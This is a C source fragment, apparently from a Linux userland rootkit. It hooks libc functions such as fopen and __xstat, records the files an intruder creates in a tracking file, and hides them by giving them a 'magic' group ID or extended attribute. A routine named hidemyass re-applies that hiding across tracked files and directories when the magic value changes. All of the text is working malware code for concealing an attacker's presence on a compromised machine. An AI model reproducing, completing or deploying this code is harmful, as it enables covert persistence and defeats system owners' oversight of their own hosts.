/* return 1 means either the path is ultimately already being tracked, or we do not want to track it for some reason.
 * return 0 means the path is not being tracked. so write it to the designated file. */
int pathtracked(const char *pathname){
    if(strcmp(".\0", pathname) == 0)
        return 1;

    if(pathname[0] != '/'){
        char *cwd = getcwd(NULL, 0);
        if(cwd == NULL) return 1;
        char tmp[strlen(cwd)+strlen(pathname)+2];
        memset(tmp, 0, sizeof(tmp));
        snprintf(tmp, sizeof(tmp), "%s/%s", cwd, pathname);
        clean(cwd);
        return pathtracked(tmp);
    }

    bdvcfg_t *bc;
    int c, noped = 0, tracked = 0;
    char **ntrack;
    struct stat assstat;
    FILE *fp;
    char line[PATH_MAX];

    if((bc = readbdvcfg(NULL)) == NULL)
        return 1;

    ntrack = notracks(&c);
    if(!ntrack){
        bree(bc);
        return 1;
    }
    for(int i = 0; i < c; i++){
        !noped && !strncmp(ntrack[i], pathname, strlen(ntrack[i])) ? noped = 1 : 0;
        clean(ntrack[i]);
    }
    free(ntrack);
    if(noped){
        bree(bc);
        return 1;
    }

    hook(CFOPEN, C__XSTAT);

    memset(&assstat, 0, sizeof(struct stat));
    if((long)call(C__XSTAT, _STAT_VER, pathname, &assstat) < 0){
        bree(bc);
        return 1;
    }

    if(!S_ISREG(assstat.st_mode) && !S_ISDIR(assstat.st_mode)){
        bree(bc);
        return 1;
    }

#ifdef USE_MAGIC_ATTR
    if(!hidden_xattr(pathname, bc->magicattr)){
        bree(bc);
        return 1;
    }
#else
    if(assstat.st_gid != bc->magicid){
        bree(bc);
        return 1;
    }
#endif

    if(strstr(pathname, "swp")){   /* ignore very temporary swp files */
        char *pathnamedup = strdup(pathname),
             *pathnametok = strtok(pathnamedup, ".");
        int count = 0;
        while(pathnametok != NULL){
            if(!strncmp(pathnametok, "swp", 3) && count++ > 1){
                clean(pathnamedup);
                bree(bc);
                return 1;
            }
            pathnametok = strtok(NULL, ".");
        }
        clean(pathnamedup);
    }

    fp = call(CFOPEN, bc->asspath, "r");
    bree(bc);
    if(fp == NULL && errno == ENOENT)
        return 0; // file doesn't exist. it will get created now.
    else if(fp == NULL) return 1;
    while(fgets(line, sizeof(line), fp) != NULL && !tracked)
        !strcmp(line, pathname) ? tracked = 1 : 0;
    fclose(fp);
    return tracked;
}

void trackwrite(const char *pathname){
    if(pathname[0] != '/'){
        char *cwd = getcwd(NULL, 0);
        if(cwd == NULL) return;
        char tmp[strlen(cwd)+strlen(pathname)+2];
        snprintf(tmp, sizeof(tmp), "%s/%s", cwd, pathname);
        clean(cwd);
        trackwrite(tmp);
        return;
    }

    FILE *fp;
    char buf[strlen(pathname)+2];
    hook(CFOPEN, CFWRITE);
    bdvcfg_t *bc = readbdvcfg(NULL);
    if(!bc) return;
    fp = call(CFOPEN, bc->asspath, "a");
    if(fp == NULL){
        bree(bc);
        return;
    }
    snprintf(buf, sizeof(buf), "%s\n", pathname);
    call(CFWRITE, buf, 1, strlen(buf), fp);
    fflush(fp);
    fclose(fp);
#ifdef USE_MAGIC_ATTR
    attrmodif(bc, bc->asspath, CSETXATTR);
#else
    chownpath(bc->asspath, bc->magicid);
#endif
    bree(bc);
}

/* called by changerkid after magic ID / magic attr has been changed.
 * recursively hides stuff that belongs to you. */
void hidemyass(bdvcfg_t *bc, id_t oldid, char *oldattr){
    FILE *fp;
    struct stat assstat, assdirstat;
    char *assdirname;

    hook(CFOPEN, C__XSTAT);

    fp = call(CFOPEN, bc->asspath, "r");

    if(fp != NULL){
        char line[PATH_MAX];
        memset(line, 0, sizeof(line));
        while(fgets(line, sizeof(line), fp) != NULL){
            line[strlen(line)-1]='\0';
            memset(&assstat, 0, sizeof(struct stat));
            if((long)call(C__XSTAT, _STAT_VER, line, &assstat) < 0)
                continue;

#ifdef USE_MAGIC_ATTR
            if(!hidden_xattr(line, oldattr))
                continue;
#else
            if(assstat.st_gid != oldid)
                continue;
#endif

            if(S_ISDIR(assstat.st_mode))
                hidedircontents(line, bc);
            else if(S_ISREG(assstat.st_mode)){
#ifdef USE_MAGIC_ATTR
                attrmodif(bc, line, CSETXATTR);
#else
                chownpath(line, bc->magicid);
#endif
            }

            if((assdirname = dirname(line)) == NULL)
                continue;
            memset(&assdirstat, 0, sizeof(struct stat));
            if((long)call(C__XSTAT, _STAT_VER, assdirname, &assdirstat) < 0)
                continue;
            
#ifdef USE_MAGIC_ATTR
            hidden_xattr(assdirname, oldattr) ? hidedircontents(assdirname, bc) : 0;
#else
            assdirstat.st_gid == oldid ? hidedircontents(assdirname, bc) : 0;
#endif
        }

        fclose(fp);
    }
}
